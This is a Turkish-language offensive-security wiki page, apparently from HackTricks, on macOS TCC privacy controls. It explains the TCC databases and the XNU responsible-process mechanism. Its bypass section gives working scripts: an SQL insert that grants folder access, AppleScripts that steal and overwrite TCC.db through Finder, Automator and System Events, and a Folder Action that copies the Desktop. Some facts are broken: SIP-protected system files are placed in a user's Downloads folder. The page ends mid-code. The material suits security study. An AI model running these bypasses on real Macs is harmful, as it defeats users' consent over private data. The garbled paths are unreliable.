# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**TCC (Transparency, Consent, and Control)**, uygulama izinlerini düzenlemeye odaklanan bir güvenlik protokolüdür. Temel amacı **konum servisleri, kişiler, fotoğraflar, mikrofon, kamera, erişilebilirlik ve tam disk erişimi** gibi hassas özellikleri korumaktır. Uygulama erişimine izin vermeden önce açık kullanıcı onayı gerektirerek TCC, gizliliği ve kullanıcıların verileri üzerindeki kontrolünü artırır.

Uygulamalar korunan özelliklere erişim istediğinde kullanıcılar TCC ile karşılaşır. Bu durum, kullanıcıların **erişimi onaylamasına veya reddetmesine** olanak tanıyan bir istem aracılığıyla görünür. Ayrıca TCC, belirli dosyalara erişim izni vermek için dosyaları **bir uygulamaya sürükleyip bırakma** gibi doğrudan kullanıcı eylemlerini de destekler. Böylece uygulamaların yalnızca açıkça izin verilen verilere erişmesi sağlanır.

![TCC istemi örneği](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**, `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` konumunda bulunan **daemon** tarafından yönetilir ve `com.apple.tccd.system` mach service'ini kaydeden `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` dosyasında yapılandırılır.

Oturum açmış her kullanıcı için `/System/Library/LaunchAgents/com.apple.tccd.plist` tarafından tanımlanan bir **user-mode tccd** çalışır ve `com.apple.tccd` ile `com.apple.usernotifications.delegate.com.apple.tccd` mach service'lerini kaydeder.

Burada system ve user olarak çalışan tccd'yi görebilirsiniz:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
İzinler **üst** uygulamadan **devralınır** ve **izinler**, **Bundle ID** ile **Developer ID** temel alınarak **izlenir**.

### TCC Veritabanları

İzin verme/reddetme bilgileri daha sonra bazı TCC veritabanlarında saklanır:

- Sistem genelindeki veritabanı: **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Bu veritabanı **SIP tarafından korunur**, bu nedenle yalnızca bir SIP bypass işlemi bu veritabanına yazabilir.
- Kullanıcı başına tercihler için kullanıcı TCC veritabanı: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** .
- Bu veritabanı korunur; bu nedenle yalnızca Full Disk Access gibi yüksek TCC ayrıcalıklarına sahip işlemler bu veritabanına yazabilir (ancak SIP tarafından korunmaz).

> [!WARNING]
> Önceki veritabanları okuma erişimi açısından da **TCC tarafından korunur**. Bu nedenle TCC ayrıcalıklarına sahip bir işlemden erişmediğiniz sürece normal kullanıcı TCC veritabanınızı **okuyamazsınız**.
>
> Ancak **FDA** veya **`kTCCServiceEndpointSecurityClient`** gibi yüksek ayrıcalıklara sahip bir işlemin kullanıcı TCC veritabanına yazabileceğini unutmayın.

- **Konum servislerine erişmesine** izin verilen istemcileri belirtmek için **`/var/db/locationd/clients.plist`** konumunda **üçüncü** bir TCC veritabanı bulunur.
- SIP tarafından korunan **`/Users/carlospolop/Downloads/REG.db`** dosyası (okuma erişimi açısından da TCC tarafından korunur), tüm **geçerli TCC veritabanlarının** **konumunu** içerir.
- SIP tarafından korunan **`/Users/carlospolop/Downloads/MDMOverrides.plist`** dosyası (okuma erişimi açısından da TCC tarafından korunur), daha fazla TCC tarafından verilen izin içerir.
- SIP tarafından korunan **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** dosyası (ancak herkes tarafından okunabilir), TCC istisnası gerektiren uygulamaların allow list'idir.

> [!TIP]
> **iOS** üzerindeki TCC veritabanı **`/private/var/mobile/Library/TCC/TCC.db`** konumundadır.

> [!TIP]
> **notification center UI**, **sistem TCC veritabanında değişiklikler** yapabilir:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Ancak kullanıcılar **kuralları silebilir veya sorgulayabilir**; bunun için **`tccutil`** command line utility'si kullanılabilir.

#### Veritabanlarını sorgulama

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Her iki veritabanını da kontrol ederek bir uygulamanın izin verdiği, engellediği veya sahip olmadığı izinleri görebilirsiniz (uygulama bu izinleri isteyecektir).

- **`service`**, TCC **permission** dizesinin gösterimidir
- **`client`**, izinlere sahip **bundle ID** veya **binary yolu**dur
- **`client_type`**, bunun bir Bundle Identifier(0) mı yoksa mutlak yol(1) mu olduğunu belirtir

<details>

<summary>Mutlak yol ise nasıl çalıştırılır</summary>

Plist dosyası şu şekilde olacak biçimde **`launctl load you_bin.plist`** komutunu çalıştırmanız yeterlidir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
- **`auth_value`** farklı değerlere sahip olabilir: denied(0), unknown(1), allowed(2) veya limited(3).
- **`auth_reason`** şu değerleri alabilir: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** alanı, çalıştırılacak binary'nin nasıl doğrulanacağını ve TCC izinlerinin nasıl verileceğini belirtir:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Tablonun **diğer alanları** hakkında daha fazla bilgi için [**bu blog gönderisine göz atın**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Ayrıca `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` bölümünden uygulamalara **zaten verilmiş izinleri** kontrol edebilirsiniz.

> [!TIP]
> Kullanıcılar **`tccutil`** kullanarak **kuralları silebilir veya sorgulayabilir**.

#### TCC izinlerini sıfırlama
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC İmza Kontrolleri

TCC **database**, uygulamanın **Bundle ID** bilgisini depolar; ancak izni kullanmak isteyen App'in doğru uygulama olduğundan **emin olmak** için **signature** hakkında **bilgi** de **depolar**.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Bu nedenle, aynı adı ve bundle ID'yi kullanan diğer uygulamalar, diğer uygulamalara verilen izinlere erişemeyecektir.

### Entitlements & TCC İzinleri

Uygulamaların bazı kaynaklar için yalnızca **request** göndermesi ve **access** izni almış olması yeterli değildir; aynı zamanda ilgili **entitlements** değerlerine de **sahip olmaları** gerekir.\
Örneğin **Telegram**, **kameraya erişim** istemek için `com.apple.security.device.camera` entitlement'ına sahiptir. Bu **entitlement** değerine **sahip olmayan** bir **app**, kameraya erişemez (kullanıcıdan izin istenmesi bile söz konusu olmaz).

Entitlements değerlerinin plist dosyaları olduğunu ve code sig'in parçası olarak özel slot'lar aracılığıyla code sig içinde ayrıca hash'lendiğini unutmayın; bu değerler kernel tarafından kernel code kullanılarak veya user model code tarafından `csops(#169)` ya da `csops_audittoken(#170)` kullanılarak sorgulanabilir.

Ancak uygulamaların `~/Desktop`, `~/Downloads` ve `~/Documents` gibi **belirli kullanıcı klasörlerine erişmek** için herhangi bir özel **entitlement** değerine sahip olması gerekmez. Sistem, erişimi şeffaf bir şekilde yönetir ve gerektiğinde **kullanıcıdan izin ister**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple'ın uygulamaları **prompt oluşturmaz**. **Entitlements** listelerinde **önceden verilmiş haklar** bulunur; bu nedenle **hiçbir zaman popup oluşturmazlar** ve **TCC veritabanlarının hiçbirinde görünmezler**. Örneğin:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Bu, Calendar'ın kullanıcıdan reminders, calendar ve address book erişimi istemesini önleyecektir.

> [!TIP]
> Entitlements hakkında bazı resmi dokümantasyonların yanı sıra, [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) adresinde **entitlements hakkında resmi olmayan ilginç bilgiler** bulmak da mümkündür.

Bazı TCC izinleri şunlardır: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Bunların tamamını tanımlayan herkese açık bir liste yoktur, ancak [**bilinenlerin listesini**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) kontrol edebilirsiniz.<sup>[[1]](#references)</sup>

### Hassas, korunmayan konumlar

- $HOME (kendisi)
- $HOME/.ssh, $HOME/.aws, vb.
- /tmp

### User Intent / com.apple.macl

Daha önce belirtildiği gibi, bir dosyayı bir App'e **sürükleyip bırakarak** App'e **erişim izni vermek** mümkündür. Bu erişim herhangi bir TCC veritabanında belirtilmez; bunun yerine dosyanın **extended** **attribute**'u olarak tutulur. Bu attribute, izin verilen App'in **UUID'sini depolar**:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> **`com.apple.macl`** özniteliğinin tccd tarafından değil, **Sandbox** tarafından yönetilmesi ilginçtir.
>
> Ayrıca, bilgisayarınızdaki bir uygulamanın UUID'sine izin veren bir dosyayı farklı bir bilgisayara taşırsanız, aynı uygulamanın farklı UID'leri olacağından bu dosyanın söz konusu uygulamaya erişim izni vermeyeceğini unutmayın.

`com.apple.macl` genişletilmiş özniteliği, **SIP tarafından korunduğu** için diğer genişletilmiş öznitelikler gibi **temizlenemez**. Ancak [**bu gönderide açıklandığı gibi**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), dosyayı **zipping** ile sıkıştırıp, **silip** ardından **unzipping** ile açarak devre dışı bırakmak mümkündür.<sup>[[3]](#references)</sup>






## XNU Responsible Process Mechanism

macOS/iOS'ta **responsible process** mekanizması, **TCC (Transparency, Consent, and Control)** framework'ü ve diğer security sistemleri tarafından, child process zincirleri boyunca bile bir eylemden nihai olarak hangi process'in sorumlu olduğunu takip etmek için kullanılan kritik bir security özelliğidir.

TCC izinleri kontrol ederken (ör. camera, microphone, location), isteği yapan immediate process'i her zaman kontrol etmez. Bunun yerine **responsible process**'i kontrol eder; bu genellikle gerçek istek bir helper process veya daemon'dan gelse bile eylemi başlatan GUI application'dır.

<details>
<summary>Responsible Process Nasıl Ayarlanır</summary>

### Process Structure Fields

XNU'daki her process, iki temel UUID identifier'ını korur:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Process'in kendi UUID'si (Mach-O binary dosyasının `LC_UUID` load command'ından)
- **`p_responsible_pid`**: Sorumlu process'in PID'si
- **`p_responsible_uuid`**: Sorumlu process'in UUID'si (bu process sonlandırıldıktan sonra bile korunur)

### Sorumlu Process Nasıl Belirlenir?

1. **Process Oluşturma Sırasında (Fork)**

`fork()` veya `posix_spawn()` aracılığıyla yeni bir process oluşturulduğunda, sorumlu process parent process'ten devralınır (`exec()` syscall mevcut `proc` yapısını yeniden kullandığından bu adım burada tekrarlanmaz):

**Konum**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Temel Noktalar:**
- Alt süreçler, ebeveynin `p_responsible_pid` değerini **devralır**
- Bu, süreç hiyerarşisi boyunca bir **sorumluluk zinciri** oluşturur
- Sorumlu süreç genellikle orijinal GUI uygulamasını gösterir

2. **Temel İşlev: `proc_set_responsible_pid()`**

**Konum**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Bu işlevin yaptığı:**
1. Hedef process'te **sorumlu PID'yi ayarlar**
2. `proc_find()` kullanarak **sorumlu process'i arar** (reference count'u artırır)
3. Sorumlu process'in `p_uuid` değerini hedef process'in `p_responsible_uuid` değerine **kopyalar**
4. `proc_rele()` ile **reference'ı serbest bırakır** (reference count'u azaltır)

3. **Neden Hem PID hem de UUID Saklanıyor?**

Çift saklama yaklaşımı kritik bir sorunu çözer:

| Alan | Amaç | Sorun | Çözüm |
|-------|---------|---------|----------|
| `p_responsible_pid` | Mevcut process'in hızlı şekilde aranması | Process sonlandıktan sonra PID yeniden kullanılabilir | Aktif process araması için kullanılır |
| `p_responsible_uuid` | Kalıcı tanımlama | Process sonlandıktan sonra da geçerliliğini korur | Security kontrolleri ve auditing için kullanılır |

**Sorun**: Sorumlu process child process'ten önce sonlanırsa PID geri dönüştürülebilir ve tamamen farklı bir process'e atanabilir.

**Çözüm**: UUID değişmezdir ve sorumlu olan belirli binary'yi, process sonlandıktan sonra bile benzersiz şekilde tanımlar.

### Process Creation Flow
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID Kaynağı: LC_UUID Load Command

`p_uuid` içinde depolanan UUID, **Mach-O executable'ın `LC_UUID` load command'ından** gelir:

1. **Derleme Zamanı**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Yürütme Zamanı**

**Konum**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Process Structure İçinde Depolanır**

**Konum**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Location**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCC'ye Ekleme

Herhangi bir noktada bir TCC veritabanı üzerinde yazma erişimi elde ederseniz, bir kayıt eklemek için aşağıdaki gibi bir şey kullanabilirsiniz (yorumları kaldırın):

<details>

<summary>TCC'ye ekleme örneği</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Bir uygulamanın içine bazı TCC izinleriyle girmeyi başardıysanız, bunları abuse etmek için TCC payload'larını içeren aşağıdaki sayfayı inceleyin:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events hakkında şunları öğrenin:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation izninin TCC adı: **`kTCCServiceAppleEvents`**\
Bu özel TCC izni, TCC veritabanı içinde **yönetilebilecek uygulamayı** da belirtir (dolayısıyla izin yalnızca her şeyi yönetmeye izin vermez).

**Finder**, **her zaman FDA'ya sahip olan** bir uygulamadır (UI'da görünmese bile); bu nedenle üzerinde **Automation** ayrıcalıklarına sahipseniz, ayrıcalıklarını abuse ederek **bazı işlemleri gerçekleştirmesini sağlayabilirsiniz**.\
Bu durumda uygulamanızın **`com.apple.Finder`** üzerinde **`kTCCServiceAppleEvents`** iznine sahip olması gerekir.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Bunu **kendi kullanıcı TCC veritabanınızı yazmak** için kötüye kullanabilirsiniz.

> [!WARNING]
> Bu izinle **Finder'dan TCC tarafından kısıtlanan klasörlere erişmesini istemeniz** ve dosyaları size vermesini sağlamanız mümkün olur; ancak bildiğim kadarıyla, **FDA erişimini tamamen kötüye kullanmak için Finder'a rastgele kod çalıştırma işlemi yaptıramazsınız**.
>
> Bu nedenle, tüm FDA yeteneklerini kötüye kullanamazsınız.

Finder üzerinde Automation ayrıcalıkları elde etmek için kullanılan TCC istemi:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** uygulamasının **`kTCCServiceAppleEvents`** TCC iznine sahip olması nedeniyle Finder gibi **herhangi bir uygulamayı kontrol edebildiğini** unutmayın. Bu nedenle Automator'u kontrol etme iznine sahip olarak aşağıdaki gibi bir kodla **Finder'ı da kontrol edebilirsiniz**:

<details>

<summary>Automator içinde bir shell açma</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Aynı durum **Script Editor app** için de geçerlidir; Finder'ı kontrol edebilir, ancak bir AppleScript kullanarak onu bir script yürütmeye zorlayamazsınız.

### Automation (SE) to some TCC

**System Events Folder Actions oluşturabilir ve Folder Actions bazı TCC klasörlerine erişebilir** (Desktop, Documents & Downloads); bu nedenle aşağıdaki gibi bir script bu davranışı abuse etmek için kullanılabilir:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

**`System Events`** üzerindeki Automation + Accessibility (**`kTCCServicePostEvent`**), **process'lere keystroke** gönderilmesine olanak tanır. Bu şekilde Finder'ı kötüye kullanarak kullanıcının TCC.db dosyasını değiştirebilir veya rastgele bir uygulamaya FDA verebilirsiniz (ancak bunun için parola istenebilir).

Finder'ın kullanıcı TCC.db dosyasının üzerine yazmasına örnek:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility`'den FDA\*

Accessibility permissions'ı abuse ederek FDA\*'ye privesc yapmak veya örneğin bir keylogger çalıştırmak için bazı [**payloads**](macos-tcc-payloads.md#accessibility) görmek üzere bu sayfayı kontrol edin.

### **Endpoint Security Client'tan FDA'ya**

**`kTCCServiceEndpointSecurityClient`** sahibiyseniz, FDA'ya sahipsiniz. Bitti.

### System Policy SysAdmin File'dan FDA'ya

**`kTCCServiceSystemPolicySysAdminFiles`**, bir kullanıcının **`NFSHomeDirectory`** attribute'unu **değiştirmenize** olanak tanır; bu da kullanıcının home folder'ını değiştirir ve dolayısıyla **TCC'yi bypass etmenizi** sağlar.<sup>[[5]](#references)</sup>

### User TCC DB'den FDA'ya

**user TCC** database'i üzerinde **write permissions** elde etmeniz, kendinize **`FDA`** permissions vermenizi sağlamaz; bunu yalnızca system database'de bulunan database verebilir.

Ancak kendinize **`Automation rights to Finder`** verebilir ve FDA\*'ya escalate olmak için önceki technique'i abuse edebilirsiniz.

### **FDA'dan TCC permissions'a**

**Full Disk Access**'in TCC'deki adı **`kTCCServiceSystemPolicyAllFiles`**'dır.

Bunun gerçek bir privesc olduğunu düşünmüyorum, ancak yararlı bulmanız ihtimaline karşı: FDA'ya sahip bir programı kontrol ediyorsanız, **users TCC database'ini modify edebilir ve kendinize herhangi bir access verebilirsiniz**. Bu, FDA permissions'ınızı kaybetmeniz ihtimaline karşı bir persistence technique olarak yararlı olabilir.

### **SIP Bypass'tan TCC Bypass'a**

System **TCC database'i**, **SIP** tarafından korunur; bu nedenle yalnızca **belirtilen entitlements'a sahip process'ler** onu modify edebilir. Bu yüzden bir attacker bir **file** üzerinde **SIP bypass** bulursa (SIP tarafından kısıtlanan bir file'ı modify edebilirse), şunları yapabilir:

- **Bir TCC database'inin protection'ını kaldırabilir** ve kendisine tüm TCC permissions'larını verebilir. Örneğin şu file'lardan herhangi birini abuse edebilir:
- TCC systems database'i
- REG.db
- MDMOverrides.plist

Ancak bu **SIP bypass'ı TCC'yi bypass etmek için** abuse etmenin başka bir seçeneği daha vardır: `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` file'ı, TCC exception gerektiren application'ların allow list'idir. Bu nedenle bir attacker bu file üzerindeki **SIP protection'ı kaldırabilir** ve **kendi application'ını** ekleyebilirse, application TCC'yi bypass edebilir.\
Örneğin terminal'i eklemek için:
```bash
# Get needed info
